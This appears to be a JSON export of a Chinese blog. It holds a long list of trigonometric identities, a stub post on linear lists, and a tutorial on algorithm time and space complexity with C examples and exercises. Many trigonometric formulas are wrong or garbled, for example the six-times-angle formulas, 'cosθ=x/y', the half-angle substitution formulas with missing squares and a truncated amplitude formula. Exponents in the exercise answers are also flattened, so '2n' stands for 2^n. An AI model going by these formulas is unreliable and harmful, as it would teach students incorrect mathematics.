sinα+sin(α+2π/n)+sin(α+2π2/n)+sin(α+2π3/n)+……+sin[α+2π(n-1)/n]=0 cosα+cos(α+2π/n)+cos(α+2π2/n)+cos(α+2π3/n)+……+cos[α+2π(n-1)/n]=0 以及 sin^2(α)+sin^2(α-2π/3)+sin^2(α+2π/3)=3/2 tanAtanBtan(A+B)+tanA+tanB-tan(A+B)=0四倍角公式 sin4A=-4(cosAsinA(2sinA^2-1)) cos4A=1+(-8cosA^2+8cosA^4) tan4A=(4tanA-4tanA^3)/(1-6tanA^2+tanA^4)五倍角公式 sin5A=16sinA^5-20sinA^3+5sinA cos5A=16cosA^5-20cosA^3+5cosA tan5A=tanA(5-10tanA^2+tanA^4)/(1-10tanA^2+5tanA^4)六倍角公式 sin6A=2(cosAsinA(2sinA+1)(2sinA-1)(-3+4sinA^2)) cos6A=((-1+2cosA)(16cosA^4-16cosA^2+1)) tan6A=(-6tanA+20tanA^3-6tanA^5)/(-1+15tanA-15tanA^4+tanA^6)七倍角公式 sin7A=-(sinA(56sinA^2-112sinA^4-7+64sinA^6)) cos7A=(cosA(56cosA^2-112cosA^4+64cosA^6-7)) tan7A=tanA(-7+35tanA^2-21tanA^4+tanA^6)/(-1+21tanA^2-35tanA^4+7tanA^6)八倍角公式 sin8A=-8(cosAsinA(2sinA^2-1)(-8sinA^2+8sinA^4+1)) cos8A=1+(160cosA^4-256cosA^6+128cosA^8-32cosA^2) tan8A=-8tanA(-1+7tanA^2-7tanA^4+tanA^6)/(1-28tanA^2+70tanA^4-28tanA^6+tanA^8)九倍角公式 sin9A=(sinA(-3+4sinA^2)(64sinA^6-96sinA^4+36sinA^2-3)) cos9A=(cosA(-3+4cosA^2)(64cosA^6-96cosA^4+36cosA^2-3)) tan9A=tanA(9-84tanA^2+126tanA^4-36tanA^6+tanA^8)/(1-36tanA^2+126tanA^4-84tanA^6+9tanA^8)十倍角公式 sin10A = 2(cosAsinA(4sinA^2+2sinA-1)(4sinA^2-2sinA-1)(-20sinA^2+5+16sinA^4)) cos10A = ((-1+2cosA^2)(256cosA^8-512cosA^6+304cosA^4-48cosA^2+1)) tan10A = -2tanA(5-60tanA^2+126tanA^4-60tanA^6+5tanA^8)/(-1+45tanA^2-210tanA^4+210tanA^6-45tanA^8+tanA^10)N倍角公式 根据棣美弗定理，(cosθ+ i sinθ)^n = cos(nθ)+ i sin(nθ) 为方便描述，令sinθ=s，cosθ=c 考虑n为正整数的情形： cos(nθ)+ i sin(nθ) = (c+ i s)^n = C(n,0)c^n + C(n,2)c^(n-2)(i s)^2 + C(n,4)c^(n- 4)(i s)^4 + … …+C(n,1)c^(n-1)(i s)^1 + C(n,3)c^(n-3)(i s)^3 + C(n,5)c^(n-5)(i s)^5 + … …=&gt;比较两边的实部与虚部 实部：cos(nθ)=C(n,0)c^n + C(n,2)c^(n-2)(i s)^2 + C(n,4)c^(n-4)(i s)^4 + … …i (虚部)：isin(nθ)=C(n,1)c^(n-1)(i s)^1 + C(n,3)c^(n-3)(i s)^3 + C(n,5)c^(n-5)(i s)^5 + … … 对所有的自然数n： 1. cos(nθ)： 公式中出现的s都是偶次方，而s^2=1-c^2(平方关系)，因此全部都可以改成以c(也就是cosθ)表示。 2. sin(nθ)： (1)当n是奇数时：公式中出现的c都是偶次方，而c^2=1-s^2(平方关系)，因此全部都可以改成以s(也 就是sinθ)表示。 (2)当n是偶数时：公式中出现的c都是奇次方，而c^2=1-s^2(平方关系)，因此即使再怎么换成s，都至少会剩c(也就是 cosθ)的一次方无法消掉。 (例. c^3=cc^2=c(1-s^2)，c^5=c(c^2)^2=c*(1-s^2)^2)半角公式 tan(A/2)=(1-cosA)/sinA=sinA/(1+cosA) sin^2(a/2)=(1-cos(a))/2 cos^2(a/2)=(1+cos(a))/2 tan(a/2)=(1-cos(a))/sin(a)=sin(a)/(1+cos(a)) 半角公式两角和公式 两角和公式 cos(α+β)=cosαcosβ-sinαsinβ cos(α-β)=cosαcosβ+sinαsinβ sin(α+β)=sinαcosβ+cosαsinβ sin(α-β)=sinαcosβ -cosαsinβ tan(α+β)=(tanα+tanβ)/(1-tanαtanβ) tan(α-β)=(tanα-tanβ)/(1+tanαtanβ) cot(A+B) = (cotAcotB-1)/(cotB+cotA) cot(A-B) = (cotAcotB+1)/(cotB-cotA)三角和公式 sin(α+β+γ)=sinα·cosβ·cosγ+cosα·sinβ·cosγ+cosα·cosβ·sinγ-sinα·sinβ·sinγ cos(α+β+γ)=cosα·cosβ·cosγ-cosα·sinβ·sinγ-sinα·cosβ·sinγ-sinα·sinβ·cosγ tan(α+β+γ)=(tanα+tanβ+tanγ-tanα·tanβ·tanγ)/(1-tanα·tanβ-tanβ·tanγ-tanγ·tanα)和差化积 sinθ+sinφ =2sin[(θ+φ)/2] cos[(θ-φ)/2] 和差化积公式sinθ-sinφ=2cos[(θ+φ)/2] sin[(θ-φ)/2] cosθ+cosφ=2cos[(θ+φ)/2]cos[(θ-φ)/2] cosθ-cosφ= -2sin[(θ+φ)/2]sin[(θ-φ)/2] tanA+tanB=sin(A+B)/cosAcosB=tan(A+B)(1-tanAtanB) tanA-tanB=sin(A-B)/cosAcosB=tan(A-B)(1+tanAtanB)积化和差 sinαsinβ=-[cos(α+β)-cos(α-β)] /2 cosαcosβ=[cos(α+β)+cos(α-β)]/2 sinαcosβ=[sin(α+β)+sin(α-β)]/2 cosαsinβ=[sin(α+β)-sin(α-β)]/2双曲函数 sh a = [e^a-e^(-a)]/2 ch a = [e^a+e^(-a)]/2 th a = sin h(a)/cos h(a) 公式一： 设α为任意角，终边相同的角的同一三角函数的值相等： sin（2kπ+α）= sinα cos（2kπ+α）= cosα tan（2kπ+α）= tanα cot（2kπ+α）= cotα 公式二： 设α为任意角，π+α的三角函数值与α的三角函数值之间的关系： sin（π+α）= -sinα cos（π+α）= -cosα tan（π+α）= tanα cot（π+α）= cotα 公式三： 任意角α与 -α的三角函数值之间的关系： sin（-α）= -sinα cos（-α）= cosα tan（-α）= -tanα cot（-α）= -cotα 公式四： 利用公式二和公式三可以得到π-α与α的三角函数值之间的关系： sin（π-α）= sinα cos（π-α）= -cosα tan（π-α）= -tanα cot（π-α）= -cotα 公式五： 利用公式-和公式三可以得到2π-α与α的三角函数值之间的关系： sin（2π-α）= -sinα cos（2π-α）= cosα tan（2π-α）= -tanα cot（2π-α）= -cotα 公式六： π/2±α及3π/2±α与α的三角函数值之间的关系： sin（π/2+α）= cosα cos（π/2+α）= -sinα tan（π/2+α）= -cotα cot（π/2+α）= -tanα sin（π/2-α）= cosα cos（π/2-α）= sinα tan（π/2-α）= cotα cot（π/2-α）= tanα sin（3π/2+α）= -cosα cos（3π/2+α）= sinα tan（3π/2+α）= -cotα cot（3π/2+α）= -tanα sin（3π/2-α）= -cosα cos（3π/2-α）= -sinα tan（3π/2-α）= cotα cot（3π/2-α）= tanα (以上k∈Z) A·sin(ωt+θ)+ B·sin(ωt+φ) = √{(A+2ABcos(θ-φ)} · sin{ωt + arcsin[ (A·sinθ+B·sinφ) / √{A^2 +B^2 +2ABcos(θ-φ)} } √表示根号,包括{……}中的内容三角函数的诱导公式（六公式） 公式一： sin(-α) = -sinα cos(-α) = cosα tan (-α)=-tanα 公式二： sin(π/2-α) = cosα cos(π/2-α) = sinα 公式三： sin(π/2+α) = cosα cos(π/2+α) = -sinα 公式四： sin(π-α) = sinα cos(π-α) = -cosα 公式五： sin(π+α) = -sinα cos(π+α) = -cosα 公式六： tanA= sinA/cosA tan（π/2+α）=－cotα tan（π/2－α）=cotα tan（π－α）=－tanα tan（π+α）=tanα 诱导公式 记背诀窍：奇变偶不变，符号看象限万能公式 万能公式 sinα=2tan(α/2)/[1+(tan(α/2))] cosα=[1-(tan(α/2))]/[1+(tan(α/2)] tanα=2tan(α/2)/[1-(tan(α/2))]其它公式 三角函数其它公式 (1) (sinα)^2+(cosα)^2=1（平方和公式） (2)1+(tanα)^2=(secα)^2 (3)1+(cotα)^2=(cscα)^2 证明下面两式，只需将一式,左右同除(sinα)^2，第二个除(cosα)^2即可 (4)对于任意非直角三角形，总有 tanA+tanB+tanC=tanAtanBtanC 证： A+B=π-C tan(A+B)=tan(π-C) (tanA+tanB)/(1-tanAtanB)=(tanπ-tanC)/(1+tanπtanC) 整理可得 tanA+tanB+tanC=tanAtanBtanC 得证 同样可以得证,当x+y+z=nπ(n∈Z)时，该关系式也成立 由tanA+tanB+tanC=tanAtanBtanC可得出以下结论 (5)cotAcotB+cotAcotC+cotBcotC=1 (6)cot(A/2)+cot(B/2)+cot(C/2)=cot(A/2)cot(B/2)cot(C/2) (7)(cosA)^2+(cosB)^2+(cosC)^2=1-2cosAcosBcosC (8)（sinA)^2+(sinB)^2+(sinC)^2=2+2cosAcosBcosC 其他非重点三角函数 csc(a) = 1/sin(a) sec(a) = 1/cos(a) (seca)^2+(csca)^2=(seca)^2(csca)^2 幂级数展开式 sin x = x-x^3/3!+x^5/5!-……+(-1)^(k-1)(x^(2k-1))/(2k-1)!+…… x∈ R cos x = 1-x^2/2!+x^4/4!-……+(-1)k(x^(2k))/(2k)!+…… x∈ R arcsin x = x + 1/2x^3/3 + 13/(24)x^5/5 + ……(|x|&lt;1) arccos x = π - ( x + 1/2x^3/3 + 13/(24)x^5/5 + …… ) (|x|&lt;1) arctan x = x - x^3/3 + x^5/5 -…… (x≤1) 无限公式 sinx=x(1-x^2/π^2)(1-x^2/4π^2)(1-x^2/9π^2)…… cosx=(1-4x^2/π^2)(1-4x^2/9π^2)(1-4x^2/25π^2)…… tanx=8x[1/(π^2-4x^2)+1/(9π^2-4x^2)+1/(25π^2-4x^2)+……] secx=4π[1/(π^2-4x^2)-1/(9π^2-4x^2)+1/(25π^2-4x^2)-+……] (sinx)x=cosx/2cosx/4cosx/8…… (1/4)tanπ/4+(1/8)tanπ/8+(1/16)tanπ/16+……=1/π arctan x = x - x^3/3 + x^5/5 -…… (x≤1) 和自变量数列求和有关的公式 sinx+sin2x+sin3x+……+sinnx=[sin(nx/2)sin((n+1)x/2)]/sin(x/2) cosx+cos2x+cos3x+……+cosnx=[cos((n+1)x/2)sin(nx/2)]/sin(x/2) tan((n+1)x/2)=(sinx+sin2x+sin3x+……+sinnx)/(cosx+cos2x+cos3x+……+cosnx) sinx+sin3x+sin5x+……+sin(2n-1)x=(sinnx)^2/sinx cosx+cos3x+cos5x+……+cos(2n-1)x=sin(2nx)/(2sinx)编辑本段内容规律 三角函数看似很多，很复杂，但只要掌握了三角函数的本质及内部规律就会发现三角函数各个公式之间有强大的联系。而掌握三角函数的内部规律及本质也是学好三角函数的关键所在。 三角函数本质： 根据三角函数定义推导公式 根据右图，有 sinθ=y/ r; cosθ=x/r; tanθ=y/x; cosθ=x/y 深刻理解了这一点，下面所有的三角公式都可以从这里出发推导出来，比如以推导 sin(A+B) = sinAcosB+cosAsinB 为例： 推导： 首先画单位圆交X轴于C，D，在单位圆上有任意A，B点。角AOD为α，BOD为β，旋转AOB使OB与OD重合，形成新A’OD。 A(cosα,sinα),B(cosβ，sinβ),A’(cos(α-β),sin(α-β)) OA’=OA=OB=OD=1,D(1,0) ∴[cos(α-β)-1]^2+[sin(α-β)]^2=(cosα-cosβ)^2+(sinα-sinβ)^2 和差化积及积化和差用还原法结合上面公式可推出（换(a+b)/2与(a-b)/2） 单位圆定义 单位圆 六个三角函数也可以依据半径为一中心为原点的单位圆来定义。单位圆定义在实际计算上没有大的价值；实际上对多数角它都依赖于直角三角形。但是单位圆定义的确允许三角函数对所有正数和负数辐角都有定义，而不只是对于在 0 和 π/2 弧度之间的角。它也提供了一个图象，把所有重要的三角函数都包含了。根据勾股定理，单位圆的等式是： 图象中给出了用弧度度量的一些常见的角。逆时针方向的度量是正角，而顺时针的度量是负角。设一个过原点的线，同 x轴正半部分得到一个角 θ，并与单位圆相交。这个交点的 x和 y坐标分别等于 cos θ和 sin θ。图象中的三角形确保了这个公式；半径等于斜边且长度为1，所以有 sin θ= y/1 和 cos θ= x/1。单位圆可以被视为是通过改变邻边和对边的长度，但保持斜边等于 1的一种查看无限个三角形的方式。","updated":"2020-07-19T00:23:27.980Z","tags":[{"name":"数学","slug":"数学","permalink":"http://xwolf191.github.io/tags/数学/"}]},{"title":"数据结构(3):线性表","date":"2017-11-10T10:15:00.000Z","path":"2017/11/10/数据结构和算法/数据结构(3)、线性表/","text":"线性表是最基本、最简单、也是最常用的一种数据结构。在线性表中数据元素之间的关系是线性，数据元素可以看成是排列在一条线上或一个环上。线性表分为静态线性表和动态线性表，常见的有顺序表(静态的)、单向链表(动态的)和双向链表(动态的)。…未完待续","updated":"2020-07-19T00:23:28.049Z","tags":[{"name":"数据结构和算法","slug":"数据结构和算法","permalink":"http://xwolf191.github.io/tags/数据结构和算法/"}]},{"title":"数据结构(2):算法","date":"2017-11-09T10:35:00.000Z","path":"2017/11/09/数据结构和算法/数据结构和算法(2)、算法/","text":"著名计算机科学家沃思（NiklausWirth）提出一个公式：算法 + 数据结构 = 程序其中算法是程序的灵魂。 一、算法的定义及特性 在数学和计算机科学/算学之中，算法/演算法/算则法（algorithm）为一个计算的具体步骤，常用于计算、数据处理和自动推理。精确而言，算法是一个表示为有限长列表的有效方法。算法应包含清晰定义的指令用于计算函数。 算法中的指令描述的是一个计算，当其运行时能从一个初始状态和初始输入（可能为空）开始，经过一系列有限而清晰定义的状态最终产生输出并停止于一个终态。一个状态到另一个状态的转移不一定是确定的。随机化算法在内的一些算法，包含了一些随机输入。 形式化算法的概念部分源自尝试解决希尔伯特提出的判定问题，并在其后尝试定义有效可计算性或者有效方法中成形。这些尝试包括库尔特·哥德尔、雅克·埃尔布朗和斯蒂芬·科尔·克莱尼分别于1930年、1934年和1935年提出的递归函数，阿隆佐·邱奇于1936年提出的λ演算，1936年埃米尔·莱昂·珀斯特的Formulation 1和艾伦·图灵1937年提出的图灵机。即使在当前，依然常有直觉想法难以定义为形式化算法的情况。 一个算法应该具有以下五个重要的特征： 有穷性（Finiteness） 算法的有穷性是指算法必须能在执行有限个步骤之后终止； 确切性(Definiteness) 算法的每一步骤必须有确切的定义； 输入项(Input) 一个算法有0个或多个输入，以刻画运算对象的初始情况，所谓0个输入是指算法本身定出了初始条件； 输出项(Output) 一个算法有一个或多个输出，以反映对输入数据加工后的结果。没有输出的算法是毫无意义的； 可行性(Effectiveness) 算法中执行的任何计算步骤都是可以被分解为基本的可执行的操作步，即每个计算步都可以在有限时间内完成（也称之为有效性）。 二、算法的设计 设计原则 正确性 算法的正确性是指算法至少应该具有输入，输出和加工处理无歧义，能正确反映问题的需求，能够得到问题的正确答案。算法正确大体分为四个层次： 1.算法程序没有语法的错误。 2.算法程序对于合法的输入数据能够产生满足要求的输出的结果。 3.算法程序对于非法的输入数据能够得出满足规格说明的结果。 4.算法程序对于精心选择的，甚至刁难的测试数据都有满足要求的输出结果。 2 . 可读性 可读性：算法设计的另一个目的是为了便于阅读，理解和交流。 写代码的目的一是为了计算机执行，另一个为了便于他人阅读，让人理解和交流。 3.键壮性 当输入数据不合法时，算法也能做出相关处理，而不是产生异常或莫名其妙的结果。 4.时间效率高和存储量低 设计方法 1）、递归和递推。递归和递推是学习算法设计的第一步。递归算法是把大问题分解成相对较小的问题的过程，而递推就是从小问题逐步推导出大问题的过程。无论递归还是递推，都应该有初始状态。 2）、搜索、枚举及优化剪枝。搜索在所有算法中既是最简单也是最复杂的算法。说它简单，是因为算法本身并不复杂，实现容易；说它最复杂，是因为要对搜索的范围进行一定的控制，不然就会出现超时等问题。搜索技术主要包括广度优先搜索和深度优先搜索。当其余算法都无法对问题进行求解时，搜索或许是唯一可用的方法。搜索是对问题的解空间进行遍历的过程。有时问题解空间相当庞大，完全遍历解空间是不现实的，此时就必须充分发掘问题所包含的约束条件，在搜索过程中应用这些条件进行剪枝，从而减少搜索量。 3）、动态规划（简称DP）。动态规划的特点是能够把很复杂的问题分解成一个个阶段来处理的递推方法，动态规划必须符合两个特点：无后效性（一个状态的抉择不会影响到更大问题的状态的抉择）及最优化原理（一个大问题的最优性必须建立在其子问题的最优性之上）。动态规划是竞赛中经常出现的的类型，而且变化很大（有线性DP，环形DP，树形DP等），难易跨度大，技巧性强，甚至还有DP的优化等问题。 4）、贪心。贪心算法是所谓的“只顾眼前利益”的算法。其具体策略是并不从整体最优上加以考虑，而是选取某种意义下的局部最优解。当然使用贪心算法时，要使得到的结果也是整体最优的。 5）、分治、构造等。分治就是把问题分成若干子问题，然后“分而治之”；构造是指按照一定的规则产生解决问题的方法。这两种算法都是在合理的分析题目后，通过一定的规律性推导，从而解决问题。快速排序可以认为是利用了分治法。 三、算法效率的度量方法 事后统计方法 这种方法主要是通过设计好的测试程序和数据,利用计算机对不同算法编制的程序的运行时间进行时间比较,从而确定算法效率的高低。 缺陷 必须根据算法提前编写好测试程序,话费时间精力较大。 运行时间严重依赖硬件以及软件等环境因素,可能会影响算法本身的优劣。 算法的测试数据设计困难,并且程序的运行时间和测试数据的规模有很大关系。 总结 事后统计法虽然直观,但是实际困难且缺陷多,很少使用。 事前分析估算方法 在计算机程序编程前，依据统计方法对算法进行估算。 一个用高级程序语言编写的程序在计算机上运行时所消耗的时间取决于下列因素： 算法采用的策略，方法(算法优劣的根本) 编译产生的代码质量(软件) 问题的输入规模 机器执行指令的速度(硬件) 一个程序的运行时间依赖于算法的好坏和问题的输入规模,所谓问题输入规模的是指输入量的多少。 在分析程序的分析时间时，最重要的是把程序看成是独立于程序设计语言的算法或者是一系列步骤。 分析一个算法的运行时间时，重要的是把基本操作的数量与输入规模关联起来，即基本操作的数量必须表示成输入规模的函数。随着问题输入规模（n）越来越大，它们在时间效率上的差异也就越来越大. 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;/** * 1-100求和 * @param end * @return */int sum(int end)&#123; int result = 0; for (int i=1;i&lt;=end;i++)&#123; result += i; &#125; return result;&#125;/** * 高斯算法 * @param end * @return */int simpleSum(int end)&#123; int result = (1+end)*end/2; return result;&#125;int main() &#123; int res = sum(100); printf(\"1+2+3+...+100=%d\\n\",res); int res2 = simpleSum(100); printf(\"1+2+3+...+100=%d\\n\",res2); return 0;&#125; 这两种求1-100以内和的算法随着end数值的增大(不考虑int溢出),算法优劣不言而喻. 四、算法的渐进增长 看几组算法的变化: A 次数 算法A(2n+4) 算法B(2n) 算法C(4n+1) 算法D(4n) n=1 6 2 5 4 n=2 8 4 9 8 n=3 10 6 13 12 n=10 24 20 41 40 n=100 204 200 401 400 n=1000 2004 2000 4001 4000 当n=1时, C要优于A(C的执行次数要比A少),随着n的增加,A要优于C.所以，综上来说A要优于C. 函数的渐近增长：给定两个函数f(n)和g(n)，如果存在一个整数N，使得对于所有的n &gt; N，f(n)总是比g(n)大，那么，我们说f(n)的渐近增长快于g(n)。 随着n的不断增大，A,B,C,D算法的常数对总体的执行次数影响可以忽略. B 次数 算法A(2n+4) 算法B(n) 算法C(2n^2+1) 算法D(n^2) n=1 6 1 2 1 n=2 8 2 9 4 n=3 10 3 19 9 n=10 24 10 201 100 n=100 204 100 20001 10000 n=1000 2004 1000 2000001 1000000 C 次数 算法A(2n^2+4n+2) 算法B(n^2) 算法C(2n^3+4n+1) 算法D(n^3) n=1 8 1 7 1 n=2 18 4 25 8 n=3 32 9 67 27 n=10 242 100 2041 10000 n=100 20402 10000 2000401 1000000 n=1000 2004002 1000000 2000004001 1000000000 观察发现,最高次幂大的函数,随着n的增大,n的最高次幂大的结果的变化也大。 五、时间复杂度 一般情况下，算法中基本操作重复执行的次数是问题规模n的某个函数，用T(n)表示，若有某个辅助函数f(n),使得当n趋近于无穷大时，T(n)/f(n)的极限值为不等于零的常数，则称f(n)是T(n)的同数量级函数。记作T(n)=Ｏ(f(n)),称Ｏ(f(n)) 为算法的渐进时间复杂度，简称时间复杂度。渐近记号（Asymptotic Notation）通常有 O、 Θ 和 Ω 记号法。Θ 记号渐进地给出了一个函数的上界和下界，当只有渐近上界时使用 O 记号，当只有渐近下界时使用 Ω 记号。尽管技术上 Θ 记号较为准确，但通常仍然使用 O 记号表示。 一般情况下,随着n的增大,T(n)增长最慢的算法为最优算法. 推导大O阶 用常数1取代运行时间中的所有加法常数 在修改后的运行次数函数中，只保留最高项 如果最高项存在且不是1，则去除与这个项相乘的常数 常数阶 以经典的高斯算法求和为例, 12345678910/** * 高斯方法 * @param end * @return */int simpleSum(int end)&#123; int result = (1+end)*end/2; printf(\"result=%d\\n\",result); return result;&#125; 程序执行两步便获取到结果,所以时间复杂度为T(n)=2,按照推导大O阶方法,时间复杂度为O(1). 线性阶 以1-100 求和为例: 12345678910111213/** * 1-100求和 * @param end * @return */int sum(int end)&#123; int result = 0; for (int i=1;i&lt;=end;i++)&#123; result += i; &#125; return result;&#125; for 循环中共执行的次数取决于end的值,所以时间复杂度为T(n)=n ,按照推导大O阶的方法,记做O(n)。 对数阶 1234567void logFunc(int n)&#123; int count = 1; while(count&lt;n)&#123; count = count * 2 ; &#125; printf(\"count=%d\\n\",count);&#125; 设循环x次后退出循环(count&gt;=n),即 2^x = n,则： x= logn 。所以时间复杂度为O(logn); 平方阶 123456789void square(int n)&#123; int sum = 0; for (int i=0;i&lt;n;i++)&#123; for (int j=0;j&lt;n;j++)&#123; sum = i+j; &#125; &#125; printf(\"sum=%d\\n\",sum);&#125; 内层循环执行n^2次, 时间复杂度为:O(n^2); 常用时间复杂度 执行次数函数 阶 非正式术语 13 O(1) 常数阶 2n+4 O(n) 线性阶 3n^2+2n+1 O(n^2) 平方阶 5log2n O(logn ) 对数阶 4nlog2n+3n+19 O(nlogn) nlogn阶 4n^3+2n^2+4n+4 O(n^3) 立方阶 2^n O(2^n) 指数阶 常见的时间复杂度消耗时间的大小排列: O(1)&lt; O(logn)&lt; O(n)&lt; O(nlogn)&lt; O(n^2)&lt; O(n^3)&lt; O(2^n)&lt; O(n!)&lt; O(n^n) 时间复杂度练习 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253分析下列各程序段的时间复杂度(1) void main() &#123;int i=1,k=0,n=10; while (i&lt;=n-1) &#123; k+=10*i;i++; &#125; &#125;(2) void main() &#123; int i=1,k=0,n=100; do &#123;k+=10*i;i++; &#125;while (i==n)&#125;(3) void main() &#123; int i=1,j=0,n=10; while (i+j&lt;=n)if (i&gt;j) j++; else i++; &#125; (4) void main() &#123; int n=10,x=n,y=0; while (x&gt;=(y+1)*(y+1)) y++;&#125;(5) void main() &#123;int n=9,i=1; while (i&lt;=n) i=i*3; &#125;(6)计算斐波拉契数列的时间复杂度。F(n)=f(n-1)+f(n-2) (7)计算该函数的时间复杂度。F(n)=6f(n-1)-9f(n-2) 即fn=6fn-1-9fn-2 (8)求多项式A(x)的值的算法可直接根据下列两个公式之一来设计： (1)A(x)=anxn+ an-1xn-1 +……+ a1x + a0 (2)A(x)=(…(anx+ an-1)x+…. a1)x)+ a0 根据算法的时间复杂性比较这两种算法的优劣。 答案： (1) O(n) (2) O(1) (3) O(n) (4) O(√n) (5)O(log3n)(6)方法： 假设F(n)的时间复杂度为T(n),有 t(n)=t(n-1)+t(n-2)&lt;2t(n-1)&lt;2*2t(n-2)&lt;2*2*2t(n-3)&lt;....&lt;2nt(0)=O(2n)即t(n)&lt;O(2n) 又 t(n)=t(n-1)+t(n-2)&gt;2t(n-2)&lt;2*2t(n-4)&lt;2*2*2t(n-8)&gt;....&gt;2n/2t(1)(n为奇数时，或2n/2t(0),n为偶数时) 即：t(n)&gt;O(2n/2) 所以O(2n/2)&lt;t(n)&lt;O(2n) 取最坏情况上限，即t(n)≈O(2n)（7）解： 令fn=rn，则原式变为rn-6rn-1+9rn-2=0 同除以rn-2 则原式为r2-6r+9=0 如果解出来的是重根的话，则第一个根以rn代入，第2个重根以nrn代入，第3个重根以n2rn代入，第4个重根以n3rn代入，依此类推。 解出的两个根为重根，均为3 所以，tn=c1*3n+c2*n*3n 依题意知t0=0,t1=1,代入后得： t0=c1*30+c2*0*30=0 t1=c1*31+c2*1*31=1 解得： c1=0,c2=1/3 则 tn=1/3*n*3n(8)解： (1)A(x)=anxn+ an-1xn-1 +……+ a1x + a0 (2)A(x)=(…(anx+ an-1)x+…. a1)x)+ a0 公式一：假设有一专门的子程序用于计算xn ，则x2需运乘法2次，x3需运行乘法3次，xn需运行乘法n次。由此可知，使用公式一时，子程序被调用的次数为n+(n-1)+(n-2)+….+1=n(n+1)/2。 公式二：使用一个简单的循环运行n-1次即可。 最坏情况和平均情况 算法(Algorithms)的复杂度(Complexity)是指运行一个算法所需消耗的资源(时间或者空间)。同一个算法处理不同的输入数据所消耗的资源也可能不同，所以分析一个算法的复杂度时，主要有三种情况可以考虑，最差情况(Worst Case)下的，平均情况(Average Case)的， 最好情况(Best Case)下的。 算法的分析也是类似，我们查找一个有n个随机数字数组中的某个数字，最好的情况是第一个数字就是，那么算法的时间复杂度为O(1)，但也有可能这个数字就在最后一个位置上待着，那么算法的时间复杂度就是O(n)，这是最坏的一种情况了。 最坏情况运行时间是一种保证，那就是运行时间将不会再坏了。在应用中，这是一种最重要的需求，通常，除非特别指定，我们提到的运行时间都是最坏情况的运行时间。 而平均运行时间也就是从概率的角度看，这个数字在每一个位置的可能性是相同的，所以平均的查找时间为n/2次后发现这个目标元素。平均情况更能反映大多数情况下算法的表现。平均情况分析就是对所有输入尺寸为n的输入，让算法运转一遍，然后取它们的平均值。当然，实际中不可能将所有可能的输入都运行一遍，因此平均情况通常指的是一种数学期望值，而计算数学期望值则需要对输入的分布情况进行假设。 平均运行时间是所有情况中最有意义的，因为它是期望的运行时间。也就是说，我们运行一段程序代码时，是希望看到平均运行时间的。可现实中，平均运行时间很难通过分析得到，一般都是通过运行一定数量的实验数据后估算出来的。 有时候我们还需要知道最好情况是什么，这有两层意义：一是我们想知道如果运气好，能好到什么程度；二是如果我们能够证明好运气与我们同在，当然需要知道运气好的时候算法表现如何。这种最好分析就是在给定输入规模的时候，看看哪种输入能使算法的运行最有效率。当然，有人认为这种最好情况分析有点假：我们可以操控输入来使一个本来很慢的算法表现得很快，从而达到蒙蔽人的效果。 对算法的分析，一种方法是计算所有情况的平均值，这种时间复杂度的计算方法称为平均时间复杂度。另一种方法是计算最坏情况下的时间复杂度，这种方法称为最坏时间复杂度。一般在没有特殊说明的情况下，都是指最坏时间复杂度。 为什么要分析最坏情况下的算法时间复杂性？ 最差情况下的复杂度是所有可能的输入数据所消耗的最大资源，如果最差情况下的复杂度符合我们的要求， 我们就可以保证所有的情况下都不会有问题。 某些算法经常遇到最差情况。比如一个查找算法，经常需要查找一个不存在的值。也许你觉得平均情况下的复杂度更吸引你，可是平均情况也有几点问题。第一，难计算，多数算法的最差情况下的复杂度要比平均情况下的容易计算的多，第二，有很多算法的平均情况和最差情况的复杂度是一样的.第三，什么才是真正的平均情况？如果你假设所有可能的输入数据出现的概率是一样的话，也是不合理的。其实多数情况是不一样的。而且输入数据的分布函数很可能是你没法知道。 考虑最好情况的复杂度更是没有意义。几乎所有的算法你都可以稍微修改一下，以获得很好的最好情况下的复杂度(要看输入数据的结构，可以是O(1))。怎样修改呢?预先计算好某一输入的答案，在算法的开始部分判断输入，如果符合，给出答案。 六 、空间复杂度 空间复杂度(Space Complexity)是对一个算法在运行过程中临时占用存储空间大小的量度，记做S(n)=O(f(n))。比如直接插入排序的时间复杂度是O(n^2),空间复杂度是O(1) 。而一般的递归算法就要有O(n)的空间复杂度了，因为每次递归都要存储返回信息。一个算法的优劣主要从算法的执行时间和所需要占用的存储空间两个方面衡量。 类似于时间复杂度的讨论，一个算法的空间复杂度S(n)定义为该算法所耗费的存储空间，它也是问题规模n的函数。渐近空间复杂度也常常简称为空间复杂度。空间复杂度(SpaceComplexity)是对一个算法在运行过程中临时占用存储空间大小的量度。一个算法在计算机存储器上所占用的存储空间，包括存储算法本身所占用的存储空间，算法的输入输出数据所占用的存储空间和算法在运行过程中临时占用的存储空间这三个方面。算法的输入输出数据所占用的存储空间是由要解决的问题决定的，是通过参数表由调用函数传递而来的，它不随本算法的不同而改变。存储算法本身所占用的存储空间与算法书写的长短成正比，要压缩这方面的存储空间，就必须编写出较短的算法。算法在运行过程中临时占用的存储空间随算法的不同而异，有的算法只需要占用少量的临时工作单元，而且不随问题规模的大小而改变，我们称这种算法是“就地\\”进行的，是节省存储的算法，有的算法需要占用的临时工作单元数与解决问题的规模n有关，它随着n的增大而增大，当n较大时，将占用较多的存储单元，例如快速排序和归并排序算法就属于这种情况。 分析一个算法所占用的存储空间要从各方面综合考虑。如对于递归算法来说，一般都比较简短，算法本身所占用的存储空间较少，但运行时需要一个附加堆栈，从而占用较多的临时工作单元；若写成非递归算法，一般可能比较长，算法本身占用的存储空间较多，但运行时将可能需要较少的存储单元。一个算法的空间复杂度只考虑在运行过程中为局部变量分配的存储空间的大小，它包括为参数表中形参变量分配的存储空间和为在函数体中定义的局部变量分配的存储空间两个部分。若一个算法为递归算法，其空间复杂度为递归所使用的堆栈空间的大小，它等于一次调用所分配的临时存储空间的大小乘以被调用的次数(即为递归调用的次数加1，这个1表示开始进行的一次非递归调用)。算法的空间复杂度一般也以数量级的形式给出。如当一个算法的空间复杂度为一个常量，即不随被处理数据量n的大小而改变时，可表示为O(1)；当一个算法的空间复杂度与以2为底的n的对数成正比时，可表示为O(log2n)；当一个算法的空间复杂度与n成线性比例关系时，可表示为O(n).若形参为数组，则只需要为它分配一个存储由实参传送来的一个地址指针的空间，即一个机器字长空间；若形参为引用方式，则也只需要为其分配存储一个地址的空间，用它来存储对应实参变量的地址，以便由系统自动引用实参变量。 参考资料: 算法【维基百科】 《算法导论》 《大话数据结构》 